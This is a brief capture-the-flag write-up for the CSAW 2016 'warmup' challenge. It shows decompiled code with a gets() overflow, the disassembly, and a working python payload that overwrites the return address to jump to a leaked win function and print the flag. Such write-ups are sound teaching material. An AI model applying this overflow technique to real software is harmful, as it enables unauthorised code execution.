# CSAW 2016 warmup

```PIE``` and ```canary``` are disabled and the binary leaks the address of the win function.

```c
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
```
We simply have to overflow the stack, base pointer and change the ```ret``` address.

```asm
        00400692 48 8d 45 c0     LEA        RAX=>local_48,[RBP + -0x40]
        00400696 48 89 c7        MOV        RDI,RAX
        00400699 b8 00 00        MOV        EAX,0x0
                 00 00
        0040069e e8 5d fe        CALL       gets                                             char * gets(char * __s)
                 ff ff

```

```bash
[root@pwn:~/csaw16_warmup]$ python -c 'print "A" * 64 + "BBBBBBBB"  + "\x0d\x06\x40\
x00\x00\x00\x00"' | ./warmup 
-Warm Up-
WOW:0x40060d
>flag{Generic Flag}
```
